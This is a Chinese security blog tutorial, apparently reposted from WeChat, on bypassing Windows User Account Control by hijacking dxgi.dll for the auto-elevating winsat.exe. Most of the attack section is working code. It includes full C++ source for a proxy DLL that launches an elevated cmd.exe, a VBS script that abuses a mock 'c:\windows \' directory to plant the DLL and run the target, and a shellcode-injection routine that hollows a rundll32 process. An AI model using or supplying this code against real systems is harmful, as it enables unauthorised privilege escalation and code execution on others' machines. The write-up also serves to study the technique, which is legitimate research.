> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/A72otmLwZm6WZfHQWzVp_w)

0x11 UAC 简介

用户帐户控制（User Account Control，简写作 UAC) 是微软公司在其 Windows Vista 及更高版本操作系统中采用的一种控制机制。其原理是通知用户是否对应用程序使用硬盘驱动器和系统文件授权，以达到帮助阻止恶意程序（有时也称为 “恶意软件”）损坏系统的效果。

UAC 需要授权的动作包括：

1. 配置 Windows Update

2. 增加或删除用户账户

3. 改变用户的账户类型

4. 改变 UAC 设置

6. 安装 ActiveX

6. 安装或移除程序

7. 安装设备驱动程序

8. 设置家长控制

9. 将文件移动或复制到 Program Files 或 Windows 目录

10. 查看其他用户文件夹

效果如下：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08V9g3l28vtErBV8evRgfdXOLU3IyEXTeCxJRXIjiar5gqTYickxweT97jibibLVIgW32gwlDhXpK73vbg/640?wx_fmt=png)

而 UAC 也是区分等级的，具体设置如下

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08V9g3l28vtErBV8evRgfdXOWHMLa1cK04ExhjX6GNEu43H9DBI8QJOP1bBGdD7oSeJpfED38rN3Ug/640?wx_fmt=png)

为什么有的应用程序不需要提示 UAC？？

一句话解释就是因为有的可以程序可以 autoElevate（自动提升）

这也是我们常用的几种 uac bypass 的手法之一. 常见手法如下

1. 白名单提权机制 - autoElevate

2.DLL 劫持

3.Windows 自身漏洞提权

4. 远程注入

5.COM 接口技术

具有 autoElevate 属性 True 的应用程序会在启动时自动提升权限，而这些应用程序往往都具备微软的签名，微软认为它是可信的。故此，在该程序启动时，将会以管理员身份启动，假设我们通过 COM 技术或者 DLL 劫持该应用程序，也能够获得管理员权限，但分析成本，利用难度也都是很高的。

0x12 BypassUAC

下面我们来查找一下具有该权限的应用程序，并利用 DLL 劫持的方法来 bypassUAC，关于 DLL 劫持的原理这里不再论述，网上已经有多相关的文章了。

```
strings.exe -s *.exe | findstr /i autoelevate
```

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08V9g3l28vtErBV8evRgfdXOmZCXYNS2u8g3SdvE5jgrvFAdDf44EG07MdZ9icqePB3MUhXdk4hXc2Q/640?wx_fmt=png)

我们最后选择了 winsat.exe 这个程序作为我们的劫持程序，下面就是查看该程序会加载的 DLL。

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08V9g3l28vtErBV8evRgfdXO9Z1geV4xdK43DVtTNzkg1Oh86E1A8q2CURr9hhlSmicTxrMrboCY0icg/640?wx_fmt=png)

发现其会加载 dxgi.dll。

下面就是需要编写我们的 dll 了，原理如下（图来自国外）

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08V9g3l28vtErBV8evRgfdXO5DMtTIpClLTJe81NY4lMuRvBGP1x0eecRItNz0T7WVtNZBTRtVT0yQ/640?wx_fmt=png)

可以通过 dllexp 来查看 dll 内的函数

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08V9g3l28vtErBV8evRgfdXOe8R8r5gajKRgFvg3vkbUF9Uz3DBIdX00Kz7HDVMiaxCyicXXQrYFfqqw/640?wx_fmt=png)

你可以自行编写所需要的 dll，也可以使用一些自动化工具来生成所需的 dll。中间也是出了很多问题，多亏了团队的 wlpz 师傅的指点，我这里最后的目的就是使用 dll 劫持来运行一个 cmd，所以最后的主要代码如下：

```
# include "pch.h"

#include <windows.h>
#include <Wtsapi32.h>

#pragma comment(lib, "Wtsapi32.lib")

# define EXTERNC extern "C"
# define NAKED __declspec(naked)
# define EXPORT EXTERNC __declspec(dllexport)
# define ALCPP EXPORT NAKED
# define ALSTD EXTERNC EXPORT NAKED void __stdcall
# define ALCFAST EXTERNC EXPORT NAKED void __fastcall
# define ALCDECL EXTERNC NAKED void __cdecl

EXTERNC 
{
    FARPROC Hijack_ApplyCompatResolutionQuirking;
    FARPROC Hijack_CompatString;
    FARPROC Hijack_CompatValue;
    FARPROC Hijack_CreateDXGIFactory;
    FARPROC Hijack_CreateDXGIFactory1;
    FARPROC Hijack_CreateDXGIFactory2;
    FARPROC Hijack_DXGID3D10CreateDevice;
    FARPROC Hijack_DXGID3D10CreateLayeredDevice;
    FARPROC Hijack_DXGID3D10GetLayeredDeviceSize;
    FARPROC Hijack_DXGID3D10RegisterLayers;
    FARPROC Hijack_DXGIDeclareAdapterRemovalSupport;
    FARPROC Hijack_DXGIDumpJournal;
    FARPROC Hijack_DXGIGetDebugInterface1;
    FARPROC Hijack_DXGIReportAdapterConfiguration;
    FARPROC Hijack_PIXBeginCapture;
    FARPROC Hijack_PIXEndCapture;
    FARPROC Hijack_PIXGetCaptureState;
    FARPROC Hijack_SetAppCompatStringPointer;
    FARPROC Hijack_UpdateHMDEmulationStatus;

}

namespace DLLHijacker
{
    HMODULE m_hModule = NULL;
    DWORD m_dwReturn[17] = {0};

    inline BOOL WINAPI Load()
{
        TCHAR tzPath[MAX_PATH];
        lstrcpy(tzPath, TEXT("dxgi"));
        m_hModule = LoadLibrary(tzPath);
        if (m_hModule == NULL)
            return FALSE;
        return (m_hModule != NULL);
    }

    FARPROC WINAPI GetAddress(PCSTR pszProcName)
{
        FARPROC fpAddress;
        CHAR szProcName[16];
        fpAddress = GetProcAddress(m_hModule, pszProcName);
        if (fpAddress == NULL)
        {
            if (HIWORD(pszProcName) == 0)
            {
                wsprintf((LPWSTR)szProcName, L"%d", pszProcName);
                pszProcName = szProcName;
            }
            ExitProcess(-2);
        }
        return fpAddress;
    }
}

using namespace DLLHijacker;



void StartProcess()
{
    STARTUPINFO startInfo = { 0 };

    PROCESS_INFORMATION procInfo = { 0 };

    WCHAR cmdline[] = L"cmd.exe";
    
    CreateProcess(cmdline, NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &startInfo, &procInfo);
}


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {
        DisableThreadLibraryCalls(hModule);
        if(Load())
        {
            Hijack_ApplyCompatResolutionQuirking = GetAddress("ApplyCompatResolutionQuirking");
      Hijack_CompatString = GetAddress("CompatString");
      Hijack_CompatValue = GetAddress("CompatValue");
      Hijack_CreateDXGIFactory = GetAddress("CreateDXGIFactory");
      Hijack_CreateDXGIFactory1 = GetAddress("CreateDXGIFactory1");
      Hijack_CreateDXGIFactory2 = GetAddress("CreateDXGIFactory2");
      Hijack_DXGID3D10CreateDevice = GetAddress("DXGID3D10CreateDevice");
      Hijack_DXGID3D10CreateLayeredDevice = GetAddress("DXGID3D10CreateLayeredDevice");
      Hijack_DXGID3D10GetLayeredDeviceSize = GetAddress("DXGID3D10GetLayeredDeviceSize");
      Hijack_DXGID3D10RegisterLayers = GetAddress("DXGID3D10RegisterLayers");
      Hijack_DXGIDeclareAdapterRemovalSupport = GetAddress("DXGIDeclareAdapterRemovalSupport");
      Hijack_DXGIDumpJournal = GetAddress("DXGIDumpJournal");
      Hijack_DXGIGetDebugInterface1 = GetAddress("DXGIGetDebugInterface1");
      Hijack_DXGIReportAdapterConfiguration = GetAddress("DXGIReportAdapterConfiguration");
      Hijack_PIXBeginCapture = GetAddress("PIXBeginCapture");
      Hijack_PIXEndCapture = GetAddress("PIXEndCapture");
      Hijack_PIXGetCaptureState = GetAddress("PIXGetCaptureState");
      Hijack_SetAppCompatStringPointer = GetAddress("SetAppCompatStringPointer");
      Hijack_UpdateHMDEmulationStatus = GetAddress("UpdateHMDEmulationStatus");
      
            StartProcess();

        }

    }
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

但是这里又碰上了一个问题，一般这种系统的 dll 都是需要权限才能更改、移动的，劫持的话就需要做一些操作，不过好在发现了一个 vbs 脚本，可以帮助我们来完成这个操作，免除权限问题，代码很简单，就不赘述了

```
Set oFSO = CreateObject("Scripting.FileSystemObject")
Set wshshell = wscript.createobject("WScript.Shell")

' Get target binary and payload
WScript.StdOut.Write("System32 binary: ")
strBinary = WScript.StdIn.ReadLine()
WScript.StdOut.Write("Path to your DLL: ")
strDLL = WScript.StdIn.ReadLine()

' Create folders
Const target = "c:\windows \"
target_sys32 = (target & "system32\")
target_binary = (target_sys32 & strBinary)
If Not oFSO.FolderExists(target) Then oFSO.CreateFolder target End If
If Not oFSO.FolderExists(target_sys32) Then oFSO.CreateFolder target_sys32 End If

' Copy legit binary and evil DLL
oFSO.CopyFile ("c:\windows\system32\" & strBinary), target_binary
oFSO.CopyFile strDLL, target_sys32
' Run, Forrest, Run!
wshshell.Run("""" & target_binary & """")

' Clean files
WScript.StdOut.Write("Clean up? (press enter to continue)")
WScript.StdIn.ReadLine()
wshshell.Run("powershell /c ""rm -r """"\\?\" & target & """""""")
```

最后的效果如下

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08V9g3l28vtErBV8evRgfdXOiciaND5h4Bicj233afGucl3p2112E9CRhRLFasb9iaGhgNoEuF6lOs9Xdg/640?wx_fmt=png)

如果需要加载 shellcode，可以改写里面的函数，比如变成下面这样

```
void StartProcess()
{
  unsigned char shellcode_calc[] =
    "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
    "\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
    "\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
    "\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
    "\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
    "\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
    "\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
    "\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
    "\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
    "\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
    "\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
    "\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
    "\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
    "\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
    "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
    "\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"
    "\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
    "\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"
    "\x63\x2e\x65\x78\x65\x00";

  TCHAR CommandLine[] = TEXT("c:\\windows\\system32\\rundll32.exe");

  CONTEXT Context; 
  struct _STARTUPINFOA StartupInfo; 
  struct _PROCESS_INFORMATION ProcessInformation; 
  LPVOID lpBaseAddress;  

  ZeroMemory(&StartupInfo, sizeof(StartupInfo));
  StartupInfo.cb = 104;
  if (CreateProcess(0, CommandLine, 0, 0, 0, 0x44, 0, 0, (LPSTARTUPINFOW)&StartupInfo, &ProcessInformation)) {
    Context.ContextFlags = 1048579;
    GetThreadContext(ProcessInformation.hThread, &Context);
    lpBaseAddress = VirtualAllocEx(ProcessInformation.hProcess, 0, 0x800u, 0x1000u, 0x40u);
    WriteProcessMemory(ProcessInformation.hProcess, lpBaseAddress, &shellcode_calc, 0x800u, 0);
    Context.Rip = (DWORD64)lpBaseAddress;
    SetThreadContext(ProcessInformation.hThread, &Context);
    ResumeThread(ProcessInformation.hThread);
    CloseHandle(ProcessInformation.hThread);
    CloseHandle(ProcessInformation.hProcess);
  }
}
```

写在后面，当时学习该方法时，发现该作者已经整理了一份可劫持的系统表，地址如下；

https://github.com/wietze/windows-dll-hijacking/blob/master/dll_hijacking_candidates.csv

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08V9g3l28vtErBV8evRgfdXOibqM8A3twe18s6MxoWUf3KWEwg7sOn3F8Kic2U2Ndj2jsK9oicS5ibzBVg/640?wx_fmt=png)

有兴趣的可以复现看看.

参考文章：

https://payloads.online/archivers/2018-12-22/1#0x12-bypass-uac%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F

https://payloads.online/archivers/2020-03-02/2

https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows